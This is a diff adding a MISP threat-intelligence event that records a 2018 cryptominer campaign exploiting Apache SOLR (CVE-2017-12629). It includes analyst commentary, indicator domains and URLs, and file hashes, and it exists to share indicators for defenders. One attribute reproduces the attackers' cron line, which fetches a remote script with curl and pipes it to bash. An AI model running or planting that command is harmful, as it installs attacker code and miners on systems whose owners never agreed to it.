@@ -1,0 +1,229 @@
+{
+    "Event":{
+        "threat_level_id":"3",
+        "date":"2018-03-09",
+        "published":true,
+        "info":"OSINT - Apache SOLR: the new target for cryptominers",
+        "publish_timestamp":"1520592420",
+        "timestamp":"1520592413",
+        "Tag":[
+            {
+                "name":"tlp:white"
+            },
+            {
+                "name":"dnc:malware-type=\"CoinMiner\""
+            },
+            {
+                "name":"osint:source-type=\"blog-post\""
+            }
+        ],
+        "Attribute":[
+            {
+                "category":"Payload delivery",
+                "comment":"",
+                "timestamp":"1520581258",
+                "type":"vulnerability",
+                "value":"CVE-2017-12629",
+                "to_ids":false
+            },
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1520586221",
+                "type":"text",
+                "value":"Earlier this year, I wrote about a campaign targeting vulnerable Oracle WebLogic installations to deploy cryptocurrency miners [1] . Based on some of the mining pool statistics associated with these installs, criminals were quite successful. Now that most Oracle WebLogic servers are fixed, miscreants had to move to another target. Based on an incident I responded to on Thursday, vulnerable Apache SOLR servers may now be â€œitâ€.\r\n\r\nWithin 9 days (from Feb, 28 to Mar, 8) this single campaign exploited 1416 vulnerable Apache SOLR servers to deploy  Monero XMRig miners across the globe. There are enough similarities between these two attacks to suggest that this is the same group that was responsible for the WebLogic campaign. Log formats, file names and even the basic install script for the miner are identical. Of course, it is always possible that we are just dealing with copycats. These scripts have been out in the open for a while now.\r\n\r\nThe flaw (CVE-2017-12629) [2] first announced October 12th 2017, affects Apache SOLR version 7.1 and below. Due to an incorrectly configured XML parser in the â€œqueryparserâ€ library, attackers can get access to sensitive information or execute arbitrary code on vulnerable systems.\r\n\r\nThe CVSS v2 score is only \"High\" (7.5). But an exploit has been widely available since October 17th, less than a week after the vulnerability was made public. It is no surprise that attackers quickly turned to this easily executed exploit. The CVSS v3 score of \"Critical\" (9.8) is probably more appropriate.",
+                "to_ids":false
+            },
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1520586219",
+                "type":"link",
+                "value":"https://isc.sans.edu/diary/23425",
+                "to_ids":false
+            },
+            {
+                "category":"Network activity",
+                "comment":"On port 8080",
+                "timestamp":"1520581259",
+                "type":"domain",
+                "value":"pool-proxy.com",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"",
+                "timestamp":"1520581260",
+                "type":"url",
+                "value":"http://mms.kenguru.ru/includes/libraries/getsetup.php",
+                "to_ids":true
+            },
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1520581260",
+                "type":"url",
+                "value":"https://isc.sans.edu/forums/diary/Campaign+is+using+a+recently+released+WebLogic+exploit+to+deploy+a+Monero+miner/23191/",
+                "to_ids":false
+            },
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1520581261",
+                "type":"url",
+                "value":"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12629",
+                "to_ids":false
+            },
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1520581261",
+                "type":"url",
+                "value":"https://www.securityfocus.com/bid/101261/info",
+                "to_ids":false
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1520586163",
+                "type":"pattern-in-file",
+                "value":"25 0,3,6,9,12,15,18 * * * curl -s \"hxxp://mms.kenguru.ru/includes/libraries/getsetup.php?p=sl\" | bash",
+                "to_ids":true
+            }
+        ],
+        "Object":[
+            {
+                "comment":"",
+                "description":"File object describing a file with meta-information",
+                "meta-category":"file",
+                "name":"file",
+                "timestamp":"1520580946",
+                "Attribute":[
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1520580946",
+                        "type":"filename",
+                        "value":"fs-manager",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1520580946",
+                        "type":"sha256",
+                        "value":"<sha256>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1520580946",
+                        "type":"text",
+                        "value":"Malicious",
+                        "to_ids":false
+                    }
+                ]
+            },
+            {
+                "comment":"",
+                "description":"File object describing a file with meta-information",
+                "meta-category":"file",
+                "name":"file",
+                "timestamp":"1520581105",
+                "Attribute":[
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1520581105",
+                        "type":"filename",
+                        "value":"config.json",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1520581105",
+                        "type":"sha256",
+                        "value":"<sha256>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1520581106",
+                        "type":"text",
+                        "value":"Malicious",
+                        "to_ids":false
+                    }
+                ]
+            },
+            {
+                "comment":"",
+                "description":"File object describing a file with meta-information",
+                "meta-category":"file",
+                "name":"file",
+                "timestamp":"1520581264",
+                "Attribute":[
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1520581262",
+                        "type":"sha1",
+                        "value":"<sha1>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1520581262",
+                        "type":"sha256",
+                        "value":"<sha256>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1520581263",
+                        "type":"md5",
+                        "value":"<md5>",
+                        "to_ids":true
+                    }
+                ]
+            },
+            {
+                "comment":"",
+                "description":"VirusTotal report",
+                "meta-category":"misc",
+                "name":"virustotal-report",
+                "timestamp":"1520581263",
+                "Attribute":[
+                    {
+                        "category":"External analysis",
+                        "comment":"",
+                        "timestamp":"1520581264",
+                        "type":"link",
+                        "value":"https://www.virustotal.com/file/7153ac617df7aa6f911e361b1f0c8188ca5c142c6aaa8faa2a59b55e0b823c1c/analysis/1519925650/",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1520581265",
+                        "type":"text",
+                        "value":"22/60",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1520581265",
+                        "type":"datetime",
+                        "value":"2018-03-01T17:34:10",
+                        "to_ids":false
+                    }
+                ]
+            }
+        ]
+    }
+}
